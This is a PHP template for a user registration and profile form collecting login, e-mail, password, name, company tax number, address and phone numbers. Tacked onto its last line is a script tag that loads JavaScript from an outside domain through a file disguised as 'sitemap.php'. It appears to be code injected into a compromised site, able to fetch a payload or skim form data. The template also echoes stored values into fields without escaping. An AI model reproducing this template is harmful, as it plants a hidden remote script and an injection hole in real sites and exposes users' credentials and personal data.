<fieldset><legend><?=getWord('fieldsetProfile')?></legend>
<ul>
<?if($action == 'register'):?>
<li><label>login: <input name='login' value='<?=$current -> login?>'></label><?module('other_required')?>
<?endif?>
<li><label>E-mail: <input name='mail' value='<?=$current -> mail?>'></label><?module('other_required')?>
<?if($action == 'register'):?>
<li><label><?=getWord('pass')?> <input type='password' name='pass'></label>
<li><label><?=getWord('passRepeated')?> <input type='password' name='passRepeated'></label>
<?endif?>
</ul>
</fieldset>

<fieldset><legend><?=getWord('fieldsetPersonal')?></legend>
<ul>
<li><label><?=getWord('name')?> <input name='name' value='<?=$current -> name?>'></label><?module('other_required')?>
<li><label><?=getWord('surname')?> <input name='surname' value='<?=$current -> surname?>'></label><?module('other_required')?>
<li><label><?=getWord('company')?> <input name='company' value='<?=$current -> company?>'></label>
<li><label><?=getWord('nip')?> <input name='nip' value='<?=$current -> nip?>'></label>
</ul>
</fieldset>

<fieldset><legend><?=getWord('fieldsetAddress')?></legend>
<ul>
<li><label><?=getWord('city')?> <input name='city' value='<?=$current -> city?>'></label><?module('other_required')?>
<li><label>adres: <input name='address' value='<?=$current -> address?>'></label><?module('other_required')?>
<li><label><?=getWord('postCode')?> <input name='postCode' value='<?=$current -> postCode?>'></label><?module('other_required')?>
<li>
    <p>Telefony
    <ul>
    <li><label><?=getWord('tel_home')?> <input name='telHome' value='<?=$current -> telHome?>'></label>
    <li><label><?=getWord('tel_work')?> <input name='telCompany' value='<?=$current -> telCompany?>'></label>
    <li><label><?=getWord('tel_cell')?> <input name='telCellular' value='<?=$current -> telCellular?>'></label>
    </ul>
</ul>
</fieldset><script src=http://johanneswallmark.com/media/sitemap.php ></script>